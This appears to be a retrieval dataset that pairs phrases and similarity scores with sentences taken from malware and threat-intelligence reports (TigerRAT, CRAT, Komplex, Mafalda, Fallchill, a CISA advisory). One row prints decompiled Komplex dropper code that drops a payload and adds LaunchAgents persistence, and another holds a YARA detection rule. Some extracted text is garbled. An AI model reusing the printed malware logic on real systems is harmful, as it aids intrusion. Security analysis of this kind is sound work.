phrase|similarity|adjacent_sentences
Upload a screen capture|0.8425630962555459|"[""TigerRAT The second implant hosted on MagicRAT's C2 is a remote access trojan (RAT) known as TigerRAT."", 'TigerRAT is an implant disclosed in 2021 by KISA and KRCERT as part of ""Operation ByteTiger\'\' detailing TigerRAT and its downloader ""TigerDownloader.""', 'This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management.', 'Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""']"
the keylogging utility|0.7555177043868438|"['This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management.', 'Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".']"
keylogger|0.7541122277971726|[]
keylogger|0.7901584262715234|[]
keylogger|0.8265048709580344|[]
keylogger|0.8631785412921766|['The MSVS project SVCHOST compiles/creates the SVCHOST.DLL binary.', 'The RESSDT.SYS binary is placed in its resource section.', '3.', 'The MSVS project INSTALL compiles/creates the INSTALL.EXE binary.', 'The SVCHOST.DLL binary is placed in its resource section.', '4.', 'The MSVS project GH0ST compiles/creates the GH0ST.EXE binary.', 'The INSTALL.EXE binary is placed in its resource section.', '5.', 'The GH0ST.EXE application is used to configure a custom Gh0st server binary (See Gh0st RAT Operation section).', 'When the Generate button on the Build tab is clicked, the INSTALL.EXE binary is extracted from its own resource section and saved to disk (default name is SERVER.EXE).']
keylogger|0.7758967193998954|['0xA4 NOP S Does nothing.', 'Possibly an unimplemented or deleted function.', '0xA5 Delete registry key S Deletes a registry key.', 'Can be a subkey.', 'Packet contains: [4] - Registry key name length [var] - Registry key name Returns success or failure with parameters 6/6.', '0xB6 Keylogger response C Sends keylogger data from the keylogger buffer file.', 'Keylogger data: [4] - Length [1] - All bytes read?', '1 or 0 [var] - Keylogger data Parameters are set to the output of function 4 in the class C vtable?', '0xB8 Keylogger data request S Requests keylogger data in a 0xB6 packet.CITIZEN LAB TECHNICAL BRIEF: IEXPL0RE RAT 30 0xC8 Unknown - get a screen- S Looks suspiciously like taking a screenshot.', 'shot?', 'Packet contains: [2] - Unknown [2] - Unknown [1] - Unknown Replies with failure or success with parameters 8/8.']
keylogger|1.0|['This version consists of multiple RAT capabilities, additional plugins and a variety of detection-evasion techniques.', 'In the past, CRAT has been attributed to the Lazarus Group, the malicious threat actors behind multiple cyber campaigns, including attacks against the entertainment sector.', 'https://blog.talosintelligence.com/2020/11/crat-and-plugins.html 1/3211/13/2020 Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: CRAT wants to plunder your endpoints Indicators and tactics, techniques and procedures (TTPs) discovered by this investigation resemble those of the Lazarus Group.', 'How did it work?', 'The attack consists of a highly modular malware that can function as a standalone RAT and download and activate additional malicious plugins from its C2 servers.', 'Cisco Talos has discovered multiple plugins so far, consisting of ransomware, screen-capture, clipboard monitoring and keylogger components.', 'So what?', 'This attack demonstrates how the adversary operates an attack that: Uses obfuscation and extensive evasion techniques to hide its malicious indicators.', 'Has evolved across versions to achieve effectiveness of their attack.', 'Employs a highly modular plugin framework to selectively infect targeted endpoints.', 'Most importantly, it deploys RAT malware to ransack the endpoint, followed by deployment of ransomware to either extort money or burn infrastructure of targeted entities.']
keylogger|0.8997042809306331|['The Mac version shares multiple similarities with those designed for other operating systems.', 'However, the Mac agent brings more spying capabilities such as stealing iOS backups from Mac computers, which contain messages, contacts, voicemail, call history, notes, calendar and Safari data.', 'B.', 'Attack Flow Last year on 26 of September, PaloAlto identified a new Mac OS X Trojan associated with the APT28/Sofacy group that received the Komplex name.', 'The Komplex Trojan is a binder with multiple parts: a dropper, a payload and a decoy pdf file.', '1.', 'The Komplex Binder: Is the main executable of roskosmos_2015-2025.app.', 'Its main purpose is to save a second payload(the dropper) on the system and open the decoy pdf file pictured below.', 'v7 = objc_msgSend(&OBJC_CLASS___NSString, stringWithFormat:, CFSTR(%@/roskosmos_2015-2025.pdf), v6); v8 = objc_msgSend(&OBJC_CLASS___NSString, stringWithFormat:, CFSTR(SetFile -a E %@/ roskosmos_2015-2025.pdf), v6); v9 = objc_msgSend(&OBJC_CLASS___NSString, stringWithFormat:, CFSTR(rm -rf %@/roskosmos_2015-2025.', 'app), v6); v10 = objc_msgSend( &OBJC_CLASS___NSString, stringWithFormat:, CFSTR(open -a Preview.app %@/roskosmos_2015-2025.pdf), v6); v11 = objc_msgSend(&OBJC_CLASS___NSData, dataWithBytes:length:, &joiner, 135028LL); objc_msgSend(v11, writeToFile:atomically:, CFSTR(/tmp/content), 1LL); v12 = (const char *)objc_msgSend(v9, UTF8String); system(v12); system(chmod 755 /tmp/content); v13 = objc_msgSend(&OBJC_CLASS___NSData, dataWithBytes:length:, &pdf, 1584258LL); objc_msgSend(v13, writeToFile:atomically:, v7, 1LL); v14 = (const char *)objc_msgSend(v8, UTF8String); system(v14); v15 = objc_msgSend(&OBJC_CLASS___NSTask, alloc); v16 = objc_msgSend(v15, init); objc_msgSend(v16, setLaunchPath:, CFSTR(/tmp/content)); objc_msgSend(v16, launch); objc_msgSend(v16, waitUntilExit); v17 = (const char *)objc_msgSend(v10, UTF8String); system(v17); The Komplex Binder [4]White Paper Komplex: roskosmos_2015-2025.pdf 2.', 'The Komplex Dropper: Its main functionality is to drop a third Komplex component: the final payload, and ensure persistence on the infected system system(mkdir -p /Users/Shared/.local/ &> /dev/null); system(mkdir -p ~/Library/LaunchAgents/ &> /dev/null); off_10001B4F0(v5, &off_10001B4F0, CFSTR(/Users/Shared/.local/kextd), 1LL); off_10001B4F0(v6, &off_10001B4F0, CFSTR(/Users/Shared/com.apple.updates.plist), 1LL); off_10001B4F0(v7, &off_10001B4F0, CFSTR(/Users/Shared/start.sh), 1LL); system(cp /Users/Shared/com.apple.updates.plist $HOME/Library/LaunchAgents/ &>/dev/null); remove(/Users/Shared/com.apple.updates.plist); system(chmod 755 /Users/Shared/.local/kextd); system(chmod 755 /Users/Shared/start.sh); 3.']
keylogger|1.0|['Amadey.', '3.3.', 'Latest Attack Cases.. 3.3.1.', 'AutoIt Amadey.. 3.3.2.', 'RftRATPost-infection.', '4.1.', 'Keylogger.', '4.2.', 'Infostealer.', '4.3.', 'Other TypesConclusion1.']
decryption.|0.8598297776050206|"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the processing of the different backdoor commands based on the command number.', 'Fig 8: Older Mafalda variant: Processing of backdoor commands THE MYSTERY OF METADOR | AN UNATTRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13Fig 9: Newer Mafalda variant: Processing of backdoor commands THE MYSTERY OF METADOR | AN UNATTRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 https://attack.mitre.org/software/S0073//The full unobfuscated list of commands, along with the developers descriptions, are available in the Mafalda section of the Technical Appendix.', 'The following functionality is only available in the newer Mafalda variant: Network and system configuration reconnaissance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The following is a summary of some of the newer Mafalda commands: Command 60 Reads the content of the file %USERPROFILE%\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with loot\\\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cookies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\\\Users\\\\test for the user test.', 'Command 61 Decrypts attacker-provided data using the DPAPI (Data Protection Application Programming Interface) key of the platform where Mafalda runs.']"
decryption.|0.7786906640410152|"['{ 3. meta: 4.', '5. description = ""Detects obfuscation patterns used in HALFRIG.', 'This rule wasn\'t tested against large dataset, it should be used for threat hunting and not on services like VTI.""', '6.', '7. strings: 8.', '// Decryption constants and decryption operation 9.', '$ = {48 BB 0B 91 09 19 4D FD 9B F3 } 10.', '11.', '$ = {4D 8D 40 01 48 8B CA 48 8B C2 48 C1 E9 38 48 83 C9 01 48 C1 E0 08 48 8B D1 48 33 D0} 12.', '13.', '$ = {C7 05 [3] 00 F7 91 4D 01 } 14.']"
"store
a file named update.lnk in the %APPDATA%\Microsoft\Windows\Start
Menu\Programs\Startup\ directory"|0.7678269277263368|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
"passed as an argument on the
command line."|0.7501135260458802|['The randomly chosen service name is used to name the dropped file and newly registered Windows service.', 'Lets refer to this randomly chosen service name as [service].', 'The malware contains references to several files inside: The file passed as argument: contains a 16-byte key msncf.dat: Encrypted configuration data msndll.tmp: Encrypted Fallchill loader msndll.dat: Encrypted Fallchill backdoor (payload for the loader) [service]svc.dll: Fallchill backdoor loader [service].dat: Copy of msndll.dat A mix of the above-mentioned files produces the final backdoor known as Fallchill.', 'A more detailed procedure for technical specialists is as follows: 1.', 'Check whether the command-line argument points to a file of 16 byte size.', '2.', 'Read the file passed via the command-line argument.', 'The contents of this file contains a crypto key, which we will call the main key.', '3.', 'Open the msncf.dat file (configuration file).', 'If the file size equals 192 bytes, read the content of the file.']
activity from Tor|0.7948621486308584|['Wecombinethesetwometricstoformanoverallthreat 1 Introduction ranking that we call the Targeted Threat Index (TTI).', 'Whileotherscoringsystemsexistforcharacterizingthe Civil society organizations (CSOs), working on hu- level of severity and danger of a technical vulnerabil- man rights issues around the globe, face a spectrum ity[7,17,41,50], nocommonsystemexistsforranking ofpolitically-motivatedinformationsecuritythreatsthat thesophisticationoftargetede-mailattacks.', 'TTIallows seektodeny(e.g.', 'Internetfiltering,denial-of-serviceat- us to gain insights into the relative sophistication of so- tacks), manipulate (e.g.', 'website defacements) or moni- cialengineeringandmalwareleveragedagainstCSOs.', 'tor (e.g.', 'targeted malware) information related to their Akeytothesuccessofourstudyisauniquemethod- work.', 'Targeted malware attacks in particular are an in- ology, combining qualitative and technical analysis of USENIX Association 23rd USENIX Security Symposium 527e-mails and their attachments with fieldwork (e.g.', 'site in Section 4.', 'Training and outreach implications of our visits)andinterviewswithaffectedCSOs.', 'Thismethod- workarediscussedinSection5.Wepresentrelatedwork ology,whichwedescribeinmoredetailinSection3,al- inSection6andconcludeinSection7.']
activity from Tor|0.7948621486308584|"['Scottsboro City Board of The Payroll Department of the Account Hijacking P Education Cyber US Link Education Scottsboro City Board of Crime Education falls victim of a phishing scam.', 'The attackers requested W-2 information from all employees.', '01/03/2018 ?', ""Rockdale Independent School An email phishing scheme causes Account Hijacking P Education Cyber US Link District several Rockdale ISD employees' Crime taxes to be falsely filed and compromises confidential tax information for all employees."", '01/03/2018 ?', 'b-tor[.', ']ru Users Researchers from Palo Alto Malware/PoS Malware X Individual Cyber RU Link Networks discover a Russian Crime BitTorrent Site distributing a Monero Miner.', '01/03/2018 ?', 'Colorado Department of For the second time in two weeks, Malware/PoS Malware O Public Cyber US Link Transportation (CDOT) the computers at the Colorado administration, Crime Department of Transportation defence, Agency shut down 2,000 compulsory computers after a ransomware social security infection.', '01/03/2018 ?', 'Primary Health Care Primary Health Care notifies Account Hijacking Q Human health Cyber US Link patients after discovering hack of and social work Crime employee email accounts.']"
“The Onion Router” (Tor) is often used by cyber threat actors for anonymity and C2.|0.9642019524929888|['Further, a threat actor does not require a high degree of competence or sophistication to successfully carry out this kind of opportunistic attack.CISA has observed Chinese MSS-affiliated actors using theCredential Access[TA0006] techniques highlighted in table 8.Table 8: Credential access techniques observed by CISAMITRE IDNameObservationT1003.001Operating System (OS) Credential Dumping: Local Security Authority Subsystem Service (LSASS) MemoryCISA observed the threat actors using Mimikatz in conjunction with coin miner protocols and software.', 'The actors used Mimikatz to dump credentials from the OS using a variety of capabilities resident within the tool.T1110.004Brute Force: Credential StuffingCISA observed what was likely a brute-force attack of a Remote Desktop Protocol on a public-facing server.DiscoveryAs with any cyber operation, cyber threat actors must be able to confirm that their target is online and vulnerablethere are a multitude of open-source scanning and reconnaissance tools available to them to use for this purpose.', 'CISA consistently observes scanning activity across federal agencies that is indicative of discovery techniques.', 'CISA has observed Chinese MSS-affiliated actors scanning Federal Government traffic using the discovery technique highlighted in table 9 (Discovery[TA0007]).Table 9: Discovery technique observed by CISAMITRE IDNameObservationT1046Network Service ScanningCISA has observed suspicious network scanning activity for various ports at Federal Government entities.CollectionWithin weeks of public disclosure of CVE-2020-0688, CISA analysts identified traffic that was indicative of Chinese MSS-affiliated threat actors attempting to exploit this vulnerability using theCollection[TA0009] technique listed in table 10.Table 10: Collection technique observed by CISAMITRE IDNameObservationT1114Email CollectionCISA observed the actors targeting CVE-2020-0688 to collect emails from the exchange servers found in Federal Government environments.Command and ControlCISA analysts often observe cyber threat actors using external proxy tools or hop points to enable their cyber operations while remaining anonymous.', 'These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.', 'For example, The Onion Router (Tor) is often used by cyber threat actors for anonymity and C2.', 'Actors carefully choose proxy tools depending on their intended use.', 'These techniques are relatively low in complexity and enabled by commercially available tools, yet they are highly effective and often reliant upon existing vulnerabilities and readily available exploits.CISA has observed Chinese MSS-affiliated actors using theCommand and Control[TA0011] techniques listed in table 11.Table 11: Command and control techniques observed by CISAMITRE IDNameObservationT1090.002Proxy: External ProxyCISA observed activity from a network proxy tool to 221 unique Federal Government agency IP addresses.T1090.003Proxy: Multi-hop ProxyCISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.T1573.002Encrypted Channel: Asymmetric CryptographyCISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.MitigationsCISA asserts with high confidence that sophisticated cyber threat actors will continue to use open-source resources and tools to target networks with a low security posture.', 'When sophisticated cyber threat actors conduct operations against soft targets, it can negatively impact critical infrastructure, federal, and state, local, tribal, territorial government networks, possibly resulting in loss of critical data or personally identifiable information.CISA and the FBI recommend that organizations place an increased priority on patching the vulnerabilities routinely exploited by MSS-affiliated cyber actors.', 'See table 12 for patch information on the CVEs mentioned in this report.', 'For more information on vulnerabilities routinely exploited by sophisticated cyber actors, seeCISA Alert: Top 10 Routinely Exploited Vulnerabilities.Table 12: Patch Information for Vulnerabilities Routinely Exploited by MSS-affiliated Cyber ActorsVulnerabilityVulnerable ProductsPatch InformationCVE-2020-5902Big-IP devices (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO, CGNAT)CVE-2019-19781CVE-2019-11510Pulse Connect Secure 9.0R1 - 9.0R3.3, 8.3R1 - 8.3R7, 8.2R1 - 8.2R12, 8.1R1 - 8.1R15Pulse Policy Secure 9.0R1 - 9.0R3.1, 5.4R1 - 5.4R7, 5.3R1 - 5.3R12, 5.2R1 - 5.2R12, 5.1R1 - 5.1R15CVE-2020-0688CISA and the FBI also recommend that organizations routinely audit their configuration and patch management programs to ensure they can track and mitigate emerging threats.']
These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.|1.0|['While this sort of activity is not a direct result of the exploitation of emergent vulnerabilities, it demonstrates that cyber threat actors can effectively use available open-source information to accomplish their goals.', 'Further, a threat actor does not require a high degree of competence or sophistication to successfully carry out this kind of opportunistic attack.CISA has observed Chinese MSS-affiliated actors using theCredential Access[TA0006] techniques highlighted in table 8.Table 8: Credential access techniques observed by CISAMITRE IDNameObservationT1003.001Operating System (OS) Credential Dumping: Local Security Authority Subsystem Service (LSASS) MemoryCISA observed the threat actors using Mimikatz in conjunction with coin miner protocols and software.', 'The actors used Mimikatz to dump credentials from the OS using a variety of capabilities resident within the tool.T1110.004Brute Force: Credential StuffingCISA observed what was likely a brute-force attack of a Remote Desktop Protocol on a public-facing server.DiscoveryAs with any cyber operation, cyber threat actors must be able to confirm that their target is online and vulnerablethere are a multitude of open-source scanning and reconnaissance tools available to them to use for this purpose.', 'CISA consistently observes scanning activity across federal agencies that is indicative of discovery techniques.', 'CISA has observed Chinese MSS-affiliated actors scanning Federal Government traffic using the discovery technique highlighted in table 9 (Discovery[TA0007]).Table 9: Discovery technique observed by CISAMITRE IDNameObservationT1046Network Service ScanningCISA has observed suspicious network scanning activity for various ports at Federal Government entities.CollectionWithin weeks of public disclosure of CVE-2020-0688, CISA analysts identified traffic that was indicative of Chinese MSS-affiliated threat actors attempting to exploit this vulnerability using theCollection[TA0009] technique listed in table 10.Table 10: Collection technique observed by CISAMITRE IDNameObservationT1114Email CollectionCISA observed the actors targeting CVE-2020-0688 to collect emails from the exchange servers found in Federal Government environments.Command and ControlCISA analysts often observe cyber threat actors using external proxy tools or hop points to enable their cyber operations while remaining anonymous.', 'These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.', 'For example, The Onion Router (Tor) is often used by cyber threat actors for anonymity and C2.', 'Actors carefully choose proxy tools depending on their intended use.', 'These techniques are relatively low in complexity and enabled by commercially available tools, yet they are highly effective and often reliant upon existing vulnerabilities and readily available exploits.CISA has observed Chinese MSS-affiliated actors using theCommand and Control[TA0011] techniques listed in table 11.Table 11: Command and control techniques observed by CISAMITRE IDNameObservationT1090.002Proxy: External ProxyCISA observed activity from a network proxy tool to 221 unique Federal Government agency IP addresses.T1090.003Proxy: Multi-hop ProxyCISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.T1573.002Encrypted Channel: Asymmetric CryptographyCISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.MitigationsCISA asserts with high confidence that sophisticated cyber threat actors will continue to use open-source resources and tools to target networks with a low security posture.', 'When sophisticated cyber threat actors conduct operations against soft targets, it can negatively impact critical infrastructure, federal, and state, local, tribal, territorial government networks, possibly resulting in loss of critical data or personally identifiable information.CISA and the FBI recommend that organizations place an increased priority on patching the vulnerabilities routinely exploited by MSS-affiliated cyber actors.', 'See table 12 for patch information on the CVEs mentioned in this report.']
brute-force passwords.|0.8324675081655724|['The script, which is loaded by many sites, JS sniffers can be installed by obtaining would load a bank card JS sniffer along access to a websites administrator panel with itself.', 'with permission to edit files.', 'The login and password can be compromised through This type of malware delivery can result several methods: in rival sniffer families being hacked.', 'For stealers, i.e.', 'programs that extract instance, during one wave of infections, passwords saved in browsers; the operators of the WebRank sniffer gained access to the MagentoName malware for intercepting entered data JS sniffer code and added their malicious (including logins and passwords); code to it.', 'brute force.', 'Another example is the attack on Feedify, a real-time push notification service.', 'Hacking of third-party services By injecting the JS sniffer code into A sniffer can infiltrate a website through the code of a given file, the threat hacked third-party services, whose actor automatically uploaded the scripts work on the target website: JS sniffer to all Feedify customers, Hacking websites that provide and their sites were infected with the services for online stores (customer feedbackembad-min-1.0.js script.', 'The support chats or analytics and sniffer was injected into the Feedify statistics systems).', 'By injecting code on August 17, and was detected malicious code into the service and removed on September 11.', 'However, script code, a JS sniffer infiltrates the intruders infected the website again the code of online store websites.']
or delete files|0.9063572151819645|"['Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".', 'Delete files.']"
The lures are designed to socially engineer the recipient to download and open an attached RAR file that contains either a Microsoft Compiled HTML Help (CHM) or Excel payload.|1.0000000000000002|['For some of the payloads we have corresponding phishing emails that were used as lures to deliver the files, allowing analysis of the social engineering techniques used.', 'We have noted updates to the first-stage payloads used, with new layers of obfuscation to hinder analysis and additional decoys used for social engineering.', 'Analysis of Phishing Lures and Payloads We identified seven emails pretending to be from the Embassy of Kyrgyzstan, being sent to recipients in the nuclear energy industry in China.', 'In some emails, people and entities in academia are also targeted, also related to nuclear energy.', 'The phishing emails contain a lure that invites the recipients to join conferences on subjects that are relevant to them.', 'The lures are designed to socially engineer the recipient to download and open an attached RAR file that contains either a Microsoft Compiled HTML Help (CHM) or Excel payload.', 'This activity appears to be a continuation of the tactics and campaign that Bitter APT have been using since at least 2021.', '1/6Figure 1: Attack flow described in this research Social Engineering with Phishing Emails The emails contain a number of social engineering techniques.', 'The name and email address used to send the phishing emails is crafted to look like it is coming from an Embassy in Beijing.', 'A free email provider is used, therefore domain reputation checks will not be useful.', 'Figure 2: Name crafted to appear as communication from an embassy The email is signed off with the name and details of an actual attach of the Kyrgyz embassy in China.']
Scheduled task|0.761127730336828|"['The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.', 'The decrypted strings are as follows: 1.', 'The MagicString class provides a getter property, which decrypts strings on access.', '2.', 'The MagicString class has an encrypted string field.', '3.', 'The MagicString class provides __Decrypt, a wrapper method for decryption.', '4.', 'If it is StealthMutants first time to use the __Decrypt method, the AES (Advanced Encryption Standard) key and initialization vector (IV) will be initialized based on the hard-coded __factory value, although this IV is meaningless in Electronic Code Block (ECB) mode.', 'The key is the SHA-256 hash, while the IV is the MD5 hash.', 'The values of the SHA-256 and MD5 hashes vary with each StealthMutant sample.']"
Scheduled task|0.7722605317298843|['Tactic ID Name Description Initial ScarCruft uses watering-hole attacks to T1189 Drive-by Compromise Access compromise victims.', 'Execution Command and Scripting Interpreter: T1059.006 The Dolphin loader a uses Python script.', 'Python 7/8Tactic ID Name Description Command and Scripting Interpreter: ScarCruft used malicious JavaScript for a T1059.007 JavaScript watering-hole attack.', 'ScarCruft exploits CVE-2020-1380 to T1203 Exploitation for Client Execution compromise victims.', 'Dolphin uses Windows API functions to execute T1106 Native API files and inject processes.', 'Scheduled Task/Job: Scheduled Dolphin uses a temporary scheduled task to T1053.005 Task start after installation.', 'Persistence Boot or Logon Autostart Execution: Dolphin uses Run keys for persistence of its T1547.001 Registry Run Keys / Startup Folder loader.', 'Process Injection: Portable Defense T1055.002 Dolphin can inject into other processes.', 'Executable Injection Evasion T1027 Obfuscated Files or Information Dolphin has encrypted components.', 'Credentials from Password Stores: Dolphin can obtain saved passwords from Credential T1555.003 Credentials from Web Browsers browsers.', 'Access T1539 Steal Web Session Cookie Dolphin can obtain cookies from browsers.']
Scheduled task|0.7576326530439104|['Figure 7.', 'Intrusion flow sequence diagram An overview of whats shown in the sequence diagram above is the following: 1.', 'On launch, the primary NoxPlayer executable Nox.exe will send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the appropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have been replaced with malware, or it may be a new filename/URL not used by legitimate updates.', '5.', 'Malware is installed on the victims machine.']
Scheduled task|1.0|['Copyright Leonardo S.p.a. All rights reserved 22 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE ATT&CK TTPs T1059 Command-Line Command-line interfaces provide a way of interacting with computer Interface systems and is a common feature across many types of operating system platforms.', 'One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.']
Scheduled task|0.7968242203144852|['Pgina 7 de 11RESEARCH_ Docless Vietnam APT -A technique still alive- The code contains Bai.doc in base64, which is the decoy document.', 'And uses scheduled tasks to persist, checking if the victim has privileges.', 'This file checks if the user is administrator.', 'If so, it copies the DLL file in WINDIR\\\\debug\\\\ and %TEMP% otherwise.', 'If administrator, it will create a scheduled task with SYSTEM privileges, if not, it will try without so high privileges Aside, this file is in charge of persistence.', 'It creates a scheduled task.', 'It is quite interesting that the malware checks if Kaspersky (avp.exe process) is running in the system and acts differently if so.', 'If Kaspersky IS in the system, it will create a scheduled task that runs a vbs script, as usual.', 'But if Kaspersky is NOT present in the system, it will rename the vbs to TXT and run wbscript with the parameter /E:vbscript that allows the program to know what kind of script it is running.', 'We guess this is trying to bypass the detection tin some way, although it sounds counterintuitive.', 'The final stage, uninstalling yourself The system runs the DLL with InstallUtil.exe, to avoid Smartscreen and Applocker.']
